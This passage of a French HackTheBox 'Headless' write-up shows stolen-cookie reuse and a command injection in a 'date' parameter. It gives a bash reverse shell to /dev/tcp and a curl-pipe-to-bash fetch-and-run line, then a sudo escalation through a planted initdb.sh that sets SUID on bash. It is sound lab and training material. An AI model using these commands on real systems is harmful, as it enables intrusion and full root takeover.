+</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>9999</span> <span class=o>(</span>http://0.0.0.0:9999/<span class=o>)</span> ...
+</span></span><span class=line><span class=cl>10.10.11.8 - - 26/Mar/2024 14:15:48<span class=o>]</span> <span class=s2>&#34;GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1&#34;</span> <span class=m>200</span> -
+</span></span></code></pre></td></tr></table></div></div><p>Nous avons recu le cookie is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</p><p>On peut voir que l&rsquo;on ne peut pas se connecter au /dashboard
+<img src=/p/hackthebox/e.png width=2880 height=414 srcset="/p/hackthebox/e_hue9592e0002ac3a7a431c0159fd5ad881_73587_480x0_resize_box_3.png 480w, /p/hackthebox/e_hue9592e0002ac3a7a431c0159fd5ad881_73587_1024x0_resize_box_3.png 1024w" loading=lazy alt=cookie class=gallery-image data-flex-grow=695 data-flex-basis=1669px></p><p>Du coup nous allons essayer de connecter au /dashboard. Pour ça nous allons utiliser le cookie que nous avons reçu.</p><p>on va mettre le cookie dans une extension de navigateur avec <a class=link href="https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search" target=_blank rel=noopener>Cookie-Editor</a></p><p><img src=/p/hackthebox/f.png width=2880 height=674 srcset="/p/hackthebox/f_hu11446ec191d73fce89021ff1a348bdae_90604_480x0_resize_box_3.png 480w, /p/hackthebox/f_hu11446ec191d73fce89021ff1a348bdae_90604_1024x0_resize_box_3.png 1024w" loading=lazy alt=upload_cookie class=gallery-image data-flex-grow=427 data-flex-basis=1025px></p><p><img src=/p/hackthebox/g.png width=1018 height=452 srcset="/p/hackthebox/g_hu411b08dc48412e3975df34b4bcb65405_36481_480x0_resize_box_3.png 480w, /p/hackthebox/g_hu411b08dc48412e3975df34b4bcb65405_36481_1024x0_resize_box_3.png 1024w" loading=lazy alt=upload_cookie class=gallery-image data-flex-grow=225 data-flex-basis=540px></p><p>Une fois tout bien préparé, on peut se connecter au /dashboard</p><p><img src=/p/hackthebox/h.png width=2880 height=1708 srcset="/p/hackthebox/h_hu62748400a68df548ef65149588dec8ba_154837_480x0_resize_box_3.png 480w, /p/hackthebox/h_hu62748400a68df548ef65149588dec8ba_154837_1024x0_resize_box_3.png 1024w" loading=lazy alt=dashboard class=gallery-image data-flex-grow=168 data-flex-basis=404px></p><p>Nous allons voir les requêtes http des dates que l&rsquo;ont envoie au serveur via burpsuite</p><p><img src=/p/hackthebox/i.png width=1128 height=530 srcset="/p/hackthebox/i_hu3c4c05f14b62a0cf43f7f19aaa198b26_69801_480x0_resize_box_3.png 480w, /p/hackthebox/i_hu3c4c05f14b62a0cf43f7f19aaa198b26_69801_1024x0_resize_box_3.png 1024w" loading=lazy alt=burp class=gallery-image data-flex-grow=212 data-flex-basis=510px></p><p>On peut voir que le serveur envoie une requête POST avec un paramètre date. On ajoute un reverse shell dans le paramètre date</p><p>Créer un reverse shell dans un fichier shell.sh</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/bin/bash -c  <span class=s2>&#34;sh -i &gt;&amp; /dev/tcp/10.10.14.62/9001 0&gt;&amp;1&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>Commande pour envoyer le reverse shell à notre machine</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>date</span><span class=o>=</span>2023-09-15<span class=p>;</span>curl http://&lt;YOUR_IP&gt;/shell.sh <span class=p>|</span>bash
+</span></span></code></pre></td></tr></table></div></div><h2 id=user><a href=#user>#</a>
+User</h2><p>On peut voir que le serveur a reçu notre reverse shell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>Mar 26, <span class=m>2024</span> - 15:07:15 <span class=o>(</span>CET<span class=o>)]</span> exegol-htb Headless <span class=c1># pwncat-cs -lp 9001</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>15:07:21<span class=o>]</span> Welcome to pwncat 🐈!                                                                                                                               __main__.py:164
+</span></span><span class=line><span class=cl><span class=o>[</span>15:07:25<span class=o>]</span> received connection from 10.10.11.8:42146                                                                                                                bind.py:84
+</span></span><span class=line><span class=cl><span class=o>[</span>15:07:26<span class=o>]</span> 0.0.0.0:9001: upgrading from /usr/bin/dash to /usr/bin/bash                                                                                          manager.py:957
+</span></span><span class=line><span class=cl><span class=o>[</span>15:07:27<span class=o>]</span> 10.10.11.8:42146: registered new host w/ db                                                                                                          manager.py:957
+</span></span><span class=line><span class=cl><span class=o>(</span><span class=nb>local</span><span class=o>)</span> pwncat:
+</span></span><span class=line><span class=cl><span class=o>(</span>remote<span class=o>)</span> dvir@headless:/home/dvir/app:
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>remote<span class=o>)</span> root@headless:/root# id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>dvir<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>dvir<span class=o>)</span> <span class=nv>euid</span><span class=o>=</span>0<span class=o>(</span>dvir<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>dvir<span class=o>)</span>,100<span class=o>(</span>users<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>(</span>remote<span class=o>)</span> root@headless:/home/dvir# cat user.txt
+</span></span><span class=line><span class=cl>0e*************ba
+</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation><a href=#privilege-escalation>#</a>
+Privilege Escalation</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>remote<span class=o>)</span> dvir@headless:/home/dvir$ sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> dvir on headless:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin, use_pty
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User dvir may run the following commands on headless:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: /usr/bin/syscheck
+</span></span></code></pre></td></tr></table></div></div><p>On va regarder le fichier syscheck</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>remote<span class=o>)</span> dvir@headless:/home/dvir$ cat /usr/bin/syscheck
+</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$EUID</span><span class=s2>&#34;</span> -ne <span class=m>0</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>  <span class=nb>exit</span> <span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=k>fi</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>last_modified_time</span><span class=o>=</span><span class=k>$(</span>/usr/bin/find /boot -name <span class=s1>&#39;vmlinuz*&#39;</span> -exec stat -c %Y <span class=o>{}</span> + <span class=p>|</span> /usr/bin/sort -n <span class=p>|</span> /usr/bin/tail -n 1<span class=k>)</span>
+</span></span><span class=line><span class=cl><span class=nv>formatted_time</span><span class=o>=</span><span class=k>$(</span>/usr/bin/date -d <span class=s2>&#34;@</span><span class=nv>$last_modified_time</span><span class=s2>&#34;</span> +<span class=s2>&#34;%d/%m/%Y %H:%M&#34;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl>/usr/bin/echo <span class=s2>&#34;Last Kernel Modification Time: </span><span class=nv>$formatted_time</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>disk_space</span><span class=o>=</span><span class=k>$(</span>/usr/bin/df -h / <span class=p>|</span> /usr/bin/awk <span class=s1>&#39;NR==2 {print $4}&#39;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl>/usr/bin/echo <span class=s2>&#34;Available disk space: </span><span class=nv>$disk_space</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>load_average</span><span class=o>=</span><span class=k>$(</span>/usr/bin/uptime <span class=p>|</span> /usr/bin/awk -F<span class=s1>&#39;load average:&#39;</span> <span class=s1>&#39;{print $2}&#39;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl>/usr/bin/echo <span class=s2>&#34;System load average: </span><span class=nv>$load_average</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> ! /usr/bin/pgrep -x <span class=s2>&#34;initdb.sh&#34;</span> <span class=p>&amp;</span>&gt;/dev/null<span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>  /usr/bin/echo <span class=s2>&#34;Database service is not running. Starting it...&#34;</span>
+</span></span><span class=line><span class=cl>  ./initdb.sh 2&gt;/dev/null
+</span></span><span class=line><span class=cl><span class=k>else</span>
+</span></span><span class=line><span class=cl>  /usr/bin/echo <span class=s2>&#34;Database service is running.&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>fi</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>exit</span> <span class=m>0</span>
+</span></span></code></pre></td></tr></table></div></div><p>Nous pouvons voir que initdb.sh est lancé, il nous suffit donc de le créer et d&rsquo;y placer une charge utile malveillante comme suit :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;chmod u+s /bin/bash&#34;</span> &gt; initdb.sh
+</span></span><span class=line><span class=cl>chmod +x initdb.sh
+</span></span></code></pre></td></tr></table></div></div><p>Exécuter ensuite /usr/bin/syscheck avec les privilèges sudo dans le même dossier que initdb.sh puis /bin/bash -p pour accéder à l&rsquo;interpréteur de commandes racine</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo /usr/bin/syscheck
+</span></span><span class=line><span class=cl>/bin/bash -p
+</span></span></code></pre></td></tr></table></div></div><h2 id=root><a href=#root>#</a>
+root</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>remote<span class=o>)</span> root@headless:/root# id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>dvir<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>dvir<span class=o>)</span> <span class=nv>euid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>dvir<span class=o>)</span>,100<span class=o>(</span>users<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>(</span>remote<span class=o>)</span> root@headless:/root# cat root.txt
+</span></span><span class=line><span class=cl>80*************ce
+</span></span></code></pre></td></tr></table></div></div><h2 id=source><a href=#source>#</a>
+Source</h2><p><a class=link href=https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#retrieve-cookies target=_blank rel=noopener>https://book.hacktricks.xyz/</a></p></section><footer class=article-footer><section class=article-tags><a href=/tags/hackthebox/>HackTheBox</a>
+<a href=/tags/writeup/>Writeup</a>
+<a href=/tags/web/>Web</a></section><section class=article-lastmod><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<span>Dernière mise à jour le Mar 26, 2024 00:00 UTC</span></section></footer></article><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//Lukas.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2024 Blog de Lukas</section><section class=powerby>Généré avec <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Thème <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.25.0>Stack</a></b> conçu par <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
